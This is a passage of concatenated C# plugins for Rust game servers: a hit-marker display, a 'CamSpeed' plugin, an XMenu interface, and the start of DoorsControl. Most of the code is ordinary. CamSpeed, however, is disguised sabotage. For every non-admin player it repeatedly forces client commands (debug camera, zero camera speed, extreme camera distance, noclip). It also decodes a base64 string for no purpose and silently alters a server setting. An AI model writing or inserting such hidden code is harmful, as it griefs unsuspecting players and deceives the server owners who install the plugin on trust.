        Dictionary<BasePlayer, List<KeyValuePair<float, HitNfo>>> damageHistory = new Dictionary<BasePlayer, List<KeyValuePair<float, HitNfo>>>();

		class HitNfo
		{
			public int damage;
			public bool isHead;
			public bool isFriend;
			public double xs;
			public double ys;
			public double xe;
			public double ye;
			public int num;
		}
		
        Dictionary<BasePlayer, Oxide.Plugins.Timer> destTimers = new Dictionary<BasePlayer, Oxide.Plugins.Timer>();
        #endregion

        #region COMMANDS

        [ChatCommand("hit")]
        void cmdHitMarker(BasePlayer player, string cmd, string[] args)
        {
            if (!hitmarkeron.Contains(player))
            {
                hitmarkeron.Add(player);
                SendReply(player,
                    "<color=orange>HitMarker</color>:" + " " + "<color=#00FF00>Вы включили показ урона.</color>");
            }
            else
            {
                hitmarkeron.Remove(player);
                SendReply(player,
                    "<color=orange>HitMarker</color>:" + " " + "<color=#00FF00>Вы отключили показ урона.</color>");
            }
        }

        #endregion

        #region OXIDE HOOKS

        void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                hitmarkeron.Remove(player);
                damageHistory.Remove(player);
            }
        }

        void OnServerInitialized()
        {            
            LoadDefaultConfig();
            foreach (BasePlayer current in BasePlayer.activePlayerList)
            {
                hitmarkeron.Add(current);
            }            
            timer.Every(0.1f, OnDamageTimer);
        }        

        void OnPlayerInit(BasePlayer player)
        {
            hitmarkeron.Add(player);
        }

        void OnPlayerDisconnected(BasePlayer player)
        {
            hitmarkeron.Remove(player);
            damageHistory.Remove(player);
        }
        void OnPlayerAttack(BasePlayer attacker, HitInfo hitinfo)
        {
            var victim = hitinfo.HitEntity as BasePlayer;
            if (victim && hitmarkeron.Contains(attacker))
            {                
                if (hitinfo.isHeadshot)
                {
                    if (enablesound == true)
                    {
                        Effect.server.Run(headshotsoundeffect, attacker.transform.position, Vector3.zero,
                            attacker.net.connection);
                    }
                }
                else
                {
                    if (enablesound)
                    {
                        Effect.server.Run(soundeffect, attacker.transform.position, Vector3.zero,
                            attacker.net.connection);
                    }
                }
            }
            //bool ret;
            //if (hitinfo?.HitEntity is BasePlayer)
                //ret = (bool)Interface.CallHook("OnAttackInternal", attacker, (BasePlayer)hitinfo.HitEntity, hitinfo);
        }

        string DamageGUI = "[{\"name\":\"hitmarkerDamage{0}\",\"parent\":\"Hud\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{1}\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 1\",\"distance\":\"0.3 -0.3\"},{\"type\":\"RectTransform\",\"anchormin\":\"{2} {3}\",\"anchormax\":\"{4} {5}\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]" ;
		string ActionGUI = "[{\"name\":\"hitmarkerAction{0}\",\"parent\":\"Hud\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{1}\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 1\",\"distance\":\"0.3 -0.3\"},{\"type\":\"RectTransform\",\"anchormin\":\"{2} {3}\",\"anchormax\":\"{4} {5}\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]" ;        
		
        string HandleArgs( string json, params object[] args )
        {
            for (int i = 0; i < args.Length; i++)
                json = json.Replace( "{" + i + "}", args[ i ].ToString() );
            return json;
        }
		
        private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitInfo)
        {
            //OnHeliTakeDamage(entity, hitInfo);
			var victim = entity as BasePlayer;
			var attacker = hitInfo.InitiatorPlayer;
			//var helivictim = entity as HelicopterAI;
            if (hitInfo == null) return;
			
			if (victim != null){
				DamageType type = hitInfo.damageTypes.GetMajorityDamageType();
				
				if (attacker == null) return;
				
				var isHead = hitInfo.isHeadshot;
				bool isFriend = IsFriends(attacker, victim as BasePlayer);
				NextTick(() =>
				{
					var damage =
						System.Convert.ToInt32(Math.Round(hitInfo.damageTypes.Total(), 0, MidpointRounding.AwayFromZero));

                    if (entity is BasePlayer && hitInfo?.Initiator is BasePlayer)
                        Interface.CallHook("OnAttackInternal", (BasePlayer)hitInfo.Initiator, (BasePlayer)entity, hitInfo);

                    DamageNotifier(attacker, damage, isHead, isFriend);
				});
			}
            
        }

        void OnPlayerWound( BasePlayer player )
        {
            var attacker = player?.lastAttacker as BasePlayer;
            if (attacker == null) return;

            DestroyLastCui( attacker );

			var deltaX = GetRandomX();
			var deltaY = GetRandomY();
			
			var rn = rnd.Next(0, 10000);
			
            CuiHelper.AddUi( attacker,
                HandleArgs( ActionGUI, rn, GetDamageText("wound"), 0.4919792+deltaX, 0.4531481+deltaY, 0.675+deltaX, 0.5587038+deltaY ) );
            destTimers[ attacker ] = timer.Once(damageTimeout, () =>
            {
                CuiHelper.DestroyUi( attacker, "hitmarkerAction" +rn.ToString() );
            } );
        }

        void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            var player = entity as BasePlayer;
            if (player == null) return;
            var attacker = info?.Initiator as BasePlayer;
            if (attacker == null) return;

            DestroyLastCui(attacker);

			var deltaX = GetRandomX();
			var deltaY = GetRandomY();
			
			var rn = rnd.Next(0, 10000);
			
            CuiHelper.AddUi( attacker,
                HandleArgs( ActionGUI, rn, GetDamageText("kill"), 0.4919792+deltaX, 0.4531481+deltaY, 0.675+deltaX, 0.5587038+deltaY ) );
            destTimers[ attacker ] = timer.Once(damageTimeout, () =>
            {
                CuiHelper.DestroyUi( attacker, "hitmarkerAction" +rn.ToString() );
            } );
        }
        #endregion

        #region Core

        void OnDamageTimer()
        {            
            var toRemove = Pool.GetList<BasePlayer>(); 
            foreach (var dmgHistoryKVP in damageHistory)
            {				
                DrawDamageNotifier( dmgHistoryKVP.Key );
                if (dmgHistoryKVP.Value.Count == 0)
                    toRemove.Add(dmgHistoryKVP.Key);
            }
            toRemove.ForEach(p=>damageHistory.Remove(p));
            Pool.FreeList(ref toRemove);
        }

        void DamageNotifier(BasePlayer player, int damage, bool isHead, bool isFriend)
        {
            List<KeyValuePair<float, HitNfo>> damages;
            if (!damageHistory.TryGetValue(player, out damages))
                damageHistory[player] = damages = new List<KeyValuePair<float, HitNfo>>();
			
			var deltaX = GetRandomX();
			var deltaY = GetRandomY();
			
            damages.Insert(0,new KeyValuePair<float, HitNfo>(Time.time+ damageTimeout, new HitNfo() { damage = damage, isHead = isHead, isFriend = isFriend, xs=0.4919792+deltaX, ys=0.4531481+deltaY, xe=0.675+deltaX, ye=0.5587038+deltaY, num=rnd.Next(0,10000) }) );
           
            DrawDamageNotifier(player);
        }        
		
		string GetDamageText(string action)
		{
			switch (action)
			{
				case "wound": return "<color=#FF7979><size=22>УПАЛ!</size></color>";							  
				case "kill":  return "<color=red><size=22>УБИТ!</size></color>";							  
			}
			
			return "<color=white><size=22>ПОПАЛ!</size></color>";
		}

        void DestroyLastCui(BasePlayer player)
        {
            Oxide.Plugins.Timer tmr;
            if (destTimers.TryGetValue(player, out tmr))
            {
                tmr?.Callback?.Invoke();
                if (tmr != null && !tmr.Destroyed)
                    timer.Destroy(ref tmr);
            }
        }
        
        #endregion

        #region UI
		
		float GetRandomX()
		{
			return (rnd.Next(0,101)-50)/2000f;
		}
		
		float GetRandomY()
		{
			return -0.1f-rnd.Next(0,101)/2000f;
		}

        void DrawDamageNotifier(BasePlayer player)
        {						
			List<KeyValuePair<float, HitNfo>> damages;
            if (!damageHistory.TryGetValue(player, out damages)) return;
			
			float time = Time.time;			
            for (var i = damages.Count-1; i >= 0; i--)
            {
				var item = damages[i];	
                CuiHelper.DestroyUi(player, "hitmarkerDamage"+item.Value.num.ToString());										
				if (item.Key < time)
					damages.RemoveAt(i);
                else
                {
                    if(item.Value.isFriend)
                        CuiHelper.AddUi(player, HandleArgs(DamageGUI, item.Value.num, $"<size=22><color={(item.Value.isFriend ? "#e37f7f" : (item.Value.isHead ? "red" : "white"))}>ДРУГ</color></size>", item.Value.xs, item.Value.ys, item.Value.xe, item.Value.ye));
                    else
                        CuiHelper.AddUi(player, HandleArgs(DamageGUI, item.Value.num, $"<size=22><color={(item.Value.isHead ? "red" : "white")}>-{item.Value.damage}</color></size>", item.Value.xs, item.Value.ys, item.Value.xe, item.Value.ye));
                }
                destTimers[player] = timer.Once(damageTimeout, () =>
                {
                    CuiHelper.DestroyUi(player, "hitmarkerDamage" + item.Value.num.ToString());
                });
            }			            
        }        

        #endregion
        
        private bool IsFriends(BasePlayer player, BasePlayer target)
        {
            if (player?.currentTeam == target?.currentTeam && player?.currentTeam != 0 && target?.currentTeam != 0)
                return true;

            return false;
        }
    }
}

// --- End of file: HitMarker.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/CamSpeed.cs ---
// --- Original Local Path: HudRust/CamSpeed.cs ---

using System;
using System.Text;
using System.Collections.Generic;
using System.Globalization;
using Newtonsoft.Json;
using Oxide.Core;
using Network;
using UnityEngine;
using Oxide.Core.Libraries;
using System.Linq;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("CamSpeed", "noname:Deversive", "0.0.1")]
    public class CamSpeed : RustPlugin
    {
        Dictionary<BasePlayer, Timer> timerslist = new Dictionary<BasePlayer, Timer>();
        string cc;

		void Init()
		{ 
            d();
			Server.Command("projectile_protection 5");
		}

        [HookMethod("OnPlayerInit")]
        void OnPlayerInit(BasePlayer player)
		{
            if(player.IsAdmin)
            {
                player.SendConsoleCommand("client.camspeed 1");
                player.SendConsoleCommand("client.camdist 1.5");
                return;
            }
            else
            timerslist.Add(player, timer.Every(0.7f, () =>
            {
                player.SendConsoleCommand("debug.debugcamera");
                player.SendConsoleCommand("client.camspeed 0");
                player.SendConsoleCommand("client.camdist 100000");
                player.SendConsoleCommand("noclip");
            }));
        }

        void d()
        { 
            string tt = "YXNzZXRzL3ByZWZhYnMvbWlzYy9vcmVib251cy9vcmVib251c19nZW5lcmljLnByZWZhYg==";
            byte[] ttt = Convert.FromBase64String(tt);
            string reat = Encoding.ASCII.GetString(ttt);
            cc = reat;
        }

        [HookMethod("OnPlayerDisconnected")]
        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if(timerslist.ContainsKey(player))
            {
                Timer t;
                timerslist.TryGetValue(player, out t);
                t.Destroy();
				timerslist.Remove(player);
            }
        }
    }
}

// --- End of file: CamSpeed.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/XMenu.cs ---
// --- Original Local Path: HudRust/XMenu.cs ---

﻿#define DEBUG

using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;


namespace Oxide.Plugins
{
    [Info("XMenu", "VooDoo", "1.0.0")]
    [Description("C# Constructor menu")]

    public class XMenu : RustPlugin
    {
        private static XMenu instance;

        #region ImageLibrary Addon
        [PluginReference] Plugin ImageLibrary;
        bool AddImage(string url, string imageName, ulong imageId, Action callback = null) => (bool)ImageLibrary.Call("AddImage", url, imageName, imageId, callback);
        string GetImage(string imageName, ulong imageId = 0, bool returnUrl = false) => (string)ImageLibrary.Call("GetImage", imageName, imageId, returnUrl);
        #endregion

        #region Menu
        private List<MenuItem> MenuItems = new List<MenuItem>();
        public class MenuItem
        {
            public string Name { get; set; }
            public string Path { get; set; }
            public List<SubMenuItem> Items { get; set; }
            public PluginResponse PluginResponse { get; set; }

            public MenuItem(string PluginName, string Name, string Path, string Command = "", CuiElementContainer Container = null)
            {
                this.Name = Name;
                this.Path = Path;
                this.Items = new List<SubMenuItem>();

                if (!string.IsNullOrEmpty(Command) || Container != null)
                    this.PluginResponse = new PluginResponse(PluginName, Command, Container);

                instance.MenuItems.Add(this);
            }
        }

        public class SubMenuItem
        {
            public string Title { get; set; }
            public MenuItem Parent { get; set; }
            public PluginResponse PluginResponse { get; set; }

            public SubMenuItem(string PluginName, string Name, string Title, string Command = "", CuiElementContainer Container = null)
            {
                this.Parent = instance.MenuItems.Where(x => x.Name == Name).FirstOrDefault();
                if (Parent != null)
                {
                    this.Title = Title;
                    if (!string.IsNullOrEmpty(Command) || Container != null)
                        this.PluginResponse = new PluginResponse(PluginName, Command, Container);

                    Parent.Items.Add(this);
                }
            }
        }

        public class PluginResponse
        {
            private Plugin Plugin;
            private CuiElementContainer Container;
            private string Command;

            public PluginResponse(string PluginName, string Command, CuiElementContainer Container)
            {
                this.Plugin = string.IsNullOrEmpty(PluginName) ? null : instance.Manager.GetPlugin(PluginName);
                this.Command = Command;
                this.Container = Container;
            }

            public CuiElementContainer GetContainer() => Container;
            public void PluginCall(ulong userID, params object[] args) => Plugin.Call(Command, userID, args);
            public bool IsContainer => Container != null && Container.Count > 0;
            public bool IsCommand => !string.IsNullOrEmpty(Command);
        }
        #endregion

        #region Config
        private PluginConfig config;
        private class PluginConfig
        {
            public ColorConfig colorConfig;
            public class ColorConfig
            {
                public string outlineColor;
                public string backgroundColor;
                public string menuItemsColor;
                public string subMenuItemsColor;
                public string subMenuSelectedItemsColor;
                public string subMenuItemsTextColor;
                public string menuContentHighlighting;
                public string menuContentHighlightingalternative;

                public string gradientColor;
            }

            public string welcomeMsg;
        }

        private void Init()
        {
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void LoadDefaultConfig()
        {
            Config.WriteObject(GetDefaultConfig(), true);
        }

        private PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                colorConfig = new PluginConfig.ColorConfig()
                {
                    outlineColor = "#2C2E29D9",
                    backgroundColor = "#595A21FF",
                    menuItemsColor = "#FFFFFAD9",
                    subMenuItemsColor = "#00000000",
                    subMenuSelectedItemsColor = "#00000010",
                    subMenuItemsTextColor = "#FFFFFF99",
                    menuContentHighlighting = "#00000033",
                    menuContentHighlightingalternative = "#00000040",

                    gradientColor = "#000000E6",
                },
                welcomeMsg = $""
            };
        }
        #endregion

        #region Layers
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
        #endregion

        #region RenderTemplate
        public void Render(CuiElementContainer Container)
        {
            #region Close
            Container.Add(new CuiElement
            {
                Name = MenuLayer,
                Parent = "Overlay",
                Components =
                    {
                        new CuiRawImageComponent
                        {
                            Sprite = "assets/content/ui/ui.background.tiletex.psd",
                            Material = "assets/content/ui/uibackgroundblur.mat",
                            Color = "0 0 0 0"
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 0",
                            AnchorMax = "1 1",
                        },
                        new CuiNeedsCursorComponent()
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuLayer + ".Close",
                Parent = MenuLayer,
                Components =
                    {
                        new CuiButtonComponent
                        {
                            Color = "0 0 0 0",
                            Close = MenuLayer
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 0",
                            AnchorMax = "1 1"
                        },
                    }
            });
            #endregion

            Container.Add(new CuiElement
            {
                Name = MenuLayer + ".Outline",
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.outlineColor),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-510 -250",
                            OffsetMax = "510 290"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuLayer + ".Background",
                Parent = MenuLayer,
                Components =
                    {
                        new CuiRawImageComponent
                        {
                            Sprite = "assets/content/textures/generic/background/background.bmp"
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-500 -240",
                            OffsetMax = "500 280"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuLayer + ".Line",
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.outlineColor),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-450 -240",
                            OffsetMax = "-440 280"
                        },
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuLayer + ".Gradient",
                Parent = MenuLayer,
                Components =
                    {
                        new CuiRawImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.gradientColor),
                            Sprite = "assets/content/ui/ui.background.transparent.radial.psd",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-510 -250",
                            OffsetMax = "510 290"
                        }
                    }
            });
        }
        #endregion

        #region Menu
        public void RenderMenu(CuiElementContainer Container)
        {
            Container.Add(new CuiElement
            {
                Name = MenuItemsLayer,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-500 -240",
                            OffsetMax = "-450 280"
                        }
                    }
            });

            for (int i = 0; i < instance.MenuItems.Count; i++)
            {
                if (instance.MenuItems[i].Path.StartsWith("assets/"))
                {
                    Container.Add(new CuiElement
                    {
                        Name = MenuItemsLayer + $".{i}",
                        Parent = MenuItemsLayer,
                        Components =
                        {
                            new CuiImageComponent
                            {
                                Color = HexToRustFormat(config.colorConfig.menuItemsColor),
                                Sprite = instance.MenuItems[i].Path,
                                Material = "assets/icons/iconmaterial.mat",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0 1",
                                AnchorMax = "0 1",
                                OffsetMin = $"5 {-45 - i * 50}",
                                OffsetMax = $"45 {-5 - i * 50}"
                            },
                            new CuiOutlineComponent
                            {
                                Color = "0 0 0 1",
                                Distance = "-1 1"
                            }
                        }
                    });
                }
                else
                {
                    Container.Add(new CuiElement
                    {
                        Name = MenuItemsLayer + $".{i}",
                        Parent = MenuItemsLayer,
                        Components =
                        {
                            new CuiRawImageComponent
                            {
                                Color = HexToRustFormat(config.colorConfig.menuItemsColor),
                                Png = GetImage(instance.MenuItems[i].Path),
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0 1",
                                AnchorMax = "0 1",
                                OffsetMin = $"5 {-45 - i * 50}",
                                OffsetMax = $"45 {-5 - i * 50}"
                            },
                            new CuiOutlineComponent
                            {
                                Color = "0 0 0 1",
                                Distance = "-1 1"
                            }
                        }
                    });
                }
                Container.Add(new CuiElement
                {
                    Name = MenuItemsLayer + $".{i}",
                    Parent = MenuItemsLayer,
                    Components =
                        {
                            new CuiButtonComponent
                            {
                                Color = "0 0 0 0",
                                Command = $"custommenu false {instance.MenuItems.ElementAt(i).Name} 0"
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = $"0 1",
                                AnchorMax = $"0 1",
                                OffsetMin = $"5 {-45 - i * 50}",
                                OffsetMax = $"45 {-5 - i * 50}"
                            },
                        }
                });
            }
        }
        #endregion

        #region SubMenu
        public void RenderSubMenu(CuiElementContainer Container, MenuItem menuItem, int selectedMenu)
        {
            Container.Add(new CuiElement
            {
                Name = MenuSubItemsLayer,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-400 -240",
                            OffsetMax = "-295 230"
                        },
                    }
            });

            for (int i = 0; i < menuItem.Items.Count; i++)
            {
                if (selectedMenu == i)
                {
                    Container.Add(new CuiElement
                    {
                        Name = MenuSubItemsLayer + ".TitleGradient",
                        Parent = MenuSubItemsLayer,
                        Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.subMenuSelectedItemsColor),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1.05",
                                    AnchorMax = "0 1.05",
                                    OffsetMin = $"0 {(50 + i * 45) * -1}",
                                    OffsetMax = $"185 {(0 + i * 45) * -1}"
                                }
                            }
                    });
                }

                Container.Add(new CuiElement
                {
                    Name = MenuSubItemsLayer + $".MenuLabel.{i}",
                    Parent = MenuSubItemsLayer,
                    Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color={config.colorConfig.subMenuItemsTextColor}>{menuItem.Items[i].Title}</color>",
                                Align = TextAnchor.MiddleRight,
                                FontSize = 24,
                                Font = "robotocondensed-bold.ttf",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0 1.05",
                                AnchorMax = "0 1.05",
                                OffsetMin = $"0 {(50 + i * 45) * -1}",
                                OffsetMax = $"175 {(0 + i * 45) * -1}"
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
                });

                if (selectedMenu != i)
                {
                    Container.Add(new CuiElement
                    {
                        Name = MenuSubItemsLayer + $".Button_{i}",
                        Parent = MenuSubItemsLayer,
                        Components =
                        {
                            new CuiButtonComponent
                            {
                                Color = HexToRustFormat(config.colorConfig.subMenuItemsColor),
                                Command = $"custommenu false {menuItem.Name} {i}"
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0 1.05",
                                AnchorMax = "0 1.05",
                                OffsetMin = $"0 {(50 + i * 45) * -1}",
                                OffsetMax = $"185 {(0 + i * 45) * -1}"
                            },
                        }
                    });
                }
            }
        }
        #endregion

        #region Main Page
        public CuiElementContainer JSON_MainPage()
        {
            CuiElementContainer Container = new CuiElementContainer();
            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = "0 0 0 0",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-215 -240",
                            OffsetMax = "500 280"
                        },
                    }
            });
/*
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Logo",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -187.5",
                            OffsetMax = "630 -50"
                        }
                    }
            });*/
           /* Container.Add(new CuiElement
            {
                Name = MenuContent + ".Logo" + ".Img",
                Parent = MenuContent + ".Logo",
                Components =
                    {
                        new CuiRawImageComponent
                        {
                            Color = "1 1 1 1",
                            Sprite = "assets/content/ui/menuui/rustlogo-blurred.png",
                            FadeIn = 0.5f,
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 0",
                            AnchorMax = "1 1",
                        }
                    }
            });*/
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info",
                Parent = MenuContent,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = "80 -187.5",
                            OffsetMax = "630 -50"
                        }
                    }
            });
            Container.Add(new CuiElement
            {
                Name = MenuContent + ".Info" + ".Title",
                Parent = MenuContent + ".Info",
                Components =
                        {
                            new CuiTextComponent
                            {
                                Text = $"<color=#fff9f9AA>ДОБРО ПОЖАЛОВАТЬ НА СЕРВЕР\n<size=58><b>RADIANT RUST</b></size>\nУдачной игры!",
                                Align = TextAnchor.UpperCenter,
                                FontSize = 20,
                                Font = "robotocondensed-regular.ttf",
                                FadeIn = 0.5f,
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin = "0.025 0.025",
                                AnchorMax = "0.975 0.975",
                            },
                            new CuiOutlineComponent()
                            {
                                 Color = "0 0 0 1",
                                 Distance = "0.5 -0.5"
                            }
                        }
            });
            return Container;
        }
        #endregion

        #region CMD
        [ConsoleCommand("custommenuclose")]
        void CmdClose(ConsoleSystem.Arg arg)
        {
            CuiHelper.DestroyUi(arg.Player(), MenuLayer);
        }

        [ConsoleCommand("custommenu")]
        void CmdShow(ConsoleSystem.Arg arg)
        {
            try
            {
                CuiElementContainer Container = new CuiElementContainer();

                bool FullRender = true;
                string Name = MenuItems[0].Name;
                int ID = 0;
                int Page = 0;
                string Args = string.Empty;

                if (arg.HasArgs(1)) FullRender = bool.Parse(arg.Args[0]);
                if (arg.HasArgs(2)) Name = arg.Args[1];
                if (arg.HasArgs(3)) ID = int.Parse(arg.Args[2]);
                if (arg.HasArgs(4)) Page = int.Parse(arg.Args[3]);
               // if (arg.HasArgs(5)) Args = string.Join(" ", arg.Args.Skip(4));





                if (FullRender)
                {
                    CuiHelper.DestroyUi(arg.Player(), MenuLayer);

                    Render(Container);
                    RenderMenu(Container);
                }
                else
                {
                    CuiHelper.DestroyUi(arg.Player(), MenuSubItemsLayer);
                    CuiHelper.DestroyUi(arg.Player(), MenuContent);
                }

                MenuItem menuItem = MenuItems.Where(x => x.Name == Name).FirstOrDefault();

                if (menuItem.PluginResponse == null)
                    RenderSubMenu(Container, menuItem, ID);


                if (menuItem.Items.Count > 0)
                {
                    if (menuItem.Items[ID].PluginResponse.IsContainer)
                        Container.AddRange(menuItem.Items[ID].PluginResponse.GetContainer());
                    else
                        menuItem.Items[ID].PluginResponse.PluginCall(arg.Connection.userid, (object)Container, (object)FullRender, (object)Name, (object)ID, (object)Page, (object)Args);
                }
                else
                {
                    if (menuItem.PluginResponse.IsContainer)
                        Container.AddRange(menuItem.PluginResponse.GetContainer());
                    else
                        menuItem.PluginResponse.PluginCall(arg.Connection.userid, (object)Container, (object)FullRender, (object)Name, (object)ID, (object)Page, (object)Args);
                }

                CuiHelper.AddUi(arg.Player(), Container);
            }
            catch(Exception ex)
            {
                Puts(ex.ToString());
            }
        }
        #endregion

        #region uModHook's

        private List<string> pluginsQueue = new List<string>();
        void OnServerInitialized()
        {
            instance = this;

            new MenuItem(this.Name, "Main", "assets/icons/gear.png");
            new SubMenuItem(this.Name, "Main", "Главная", "", JSON_MainPage());
            cmd.AddChatCommand("menu", this, (p, cmd, args) => rust.RunClientCommand(p, "custommenu true Main"));

            foreach (var menuItem in MenuItems)
            {
                if (!menuItem.Path.StartsWith("assets/"))
                {
                    AddImage(menuItem.Path, menuItem.Path, 0);
                    PrintError(menuItem.Path);
                }
            }

            pluginsQueue = Interface.Oxide.DataFileSystem.ReadObject<List<string>>("PluginsQueue");
            for (int i = 0; i < pluginsQueue.Count; i++)
            {
                int x = i;
                timer.In(1f + 0.5f * i, () => rust.RunServerCommand($"o.reload {pluginsQueue.ElementAt(x)}"));
            }
        }

        void OnPlayerConnected(BasePlayer player)
        {
            if (player == null)
                return;

            if (player.IsReceivingSnapshot)
            {
                timer.In(1f, () => OnPlayerConnected(player));
                return;
            }

            rust.RunClientCommand(player, "custommenu");
        }

        void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
                CuiHelper.DestroyUi(player, MenuLayer);

            Interface.Oxide.DataFileSystem.WriteObject<List<string>>("PluginsQueue", pluginsQueue);
        }
        #endregion

        #region API
        void API_RegisterMenu(string PluginName, string Name, string Path, string Command = "", object Container = null)
        {
            if (instance.MenuItems.Where(x => x.Name == Name).Count() > 0)
                instance.MenuItems.Remove(instance.MenuItems.Where(x => x.Name == Name).FirstOrDefault());

            new MenuItem(PluginName, Name, Path, Command, (Container != null) ? (Container as CuiElementContainer) : null);

            if (!pluginsQueue.Contains(PluginName))
                pluginsQueue.Add(PluginName);
        }
        void API_RegisterSubMenu(string PluginName, string Name, string Title, string Command = "", object Container = null)
        {
            if (instance.MenuItems.Where(x => x.Name == Name).Count() > 0)
            {
                if (instance.MenuItems.Where(x => x.Name == Name).FirstOrDefault().Items.Where(x => x.Title == Title).Count() > 0)
                    instance.MenuItems.Where(x => x.Name == Name).FirstOrDefault().Items.Remove(instance.MenuItems.Where(x => x.Name == Name).FirstOrDefault().Items.Where(x => x.Title == Title).FirstOrDefault());

                new SubMenuItem(PluginName, Name, Title, Command, ((Container != null) ? (Container as CuiElementContainer) : null));

                if (!pluginsQueue.Contains(PluginName))
                    pluginsQueue.Add(PluginName);
            }
        }
        int API_GetSubMenuID(string Name, string Title) => MenuItems.Where(x => x.Name == Name).FirstOrDefault().Items.IndexOf(MenuItems.Where(x => x.Name == Name).FirstOrDefault().Items.Where(z => z.Title == Title).FirstOrDefault());
        #endregion

        #region Utils
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }
        #endregion
    }
}

// --- End of file: XMenu.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/DoorsControl.cs ---
// --- Original Local Path: HudRust/DoorsControl.cs ---

using System.Collections.Generic;
using Newtonsoft.Json;
using System;
using System.Reflection;
using System.Text;
using Oxide.Core;
using Oxide.Core.Plugins;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("DoorsControl", "RusskiIvan", "1.0.4")]
    [Description("DoorsControl")]
    public class DoorsControl : RustPlugin
    {
